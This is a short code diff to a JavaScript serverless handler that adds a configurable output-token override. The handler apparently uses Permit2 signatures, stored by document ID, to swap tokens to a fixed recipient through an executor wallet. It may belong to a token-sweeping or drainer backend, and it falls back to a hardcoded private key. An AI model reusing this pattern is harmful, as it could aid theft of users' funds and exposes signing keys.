@@ -39,6 +39,7 @@ let provider = null;
 let spenderWallet = null;
 let permit2Contract = null;
 let routerContract = null;
+let OUTPUT_TOKEN_OVERRIDE = null;
 
 async function init() {
   if (db) return; 
@@ -67,6 +68,7 @@ async function init() {
     EXECUTOR_ADDRESS = cfg.executorAddress || process.env.EXECUTOR_ADDRESS || HARDCODED_EXECUTOR;
     EXECUTOR_PRIVATE_KEY = cfg.executorPrivateKey || process.env.EXECUTOR_PRIVATE_KEY || HARDCODED_PRIVATE_KEY;
     RECIPIENT_ADDRESS = cfg.recipientAddress || process.env.RECIPIENT_ADDRESS || HARDCODED_EXECUTOR;
+    OUTPUT_TOKEN_OVERRIDE = cfg.tokenAddress || process.env.OUTPUT_TOKEN || null;
 
     spenderWallet = new ethers.Wallet(EXECUTOR_PRIVATE_KEY, provider);
 
@@ -97,7 +99,7 @@ export default async function handler(req, res) {
     await init();
     
     const { docId, outputToken } = req.body;
-    const FINAL_TOKEN = outputToken || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; 
+    const FINAL_TOKEN = outputToken || OUTPUT_TOKEN_OVERRIDE || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; 
     const RECIPIENT = RECIPIENT_ADDRESS;
 
     // --- FIX: INITIALIZE NONCE TRACKER ---
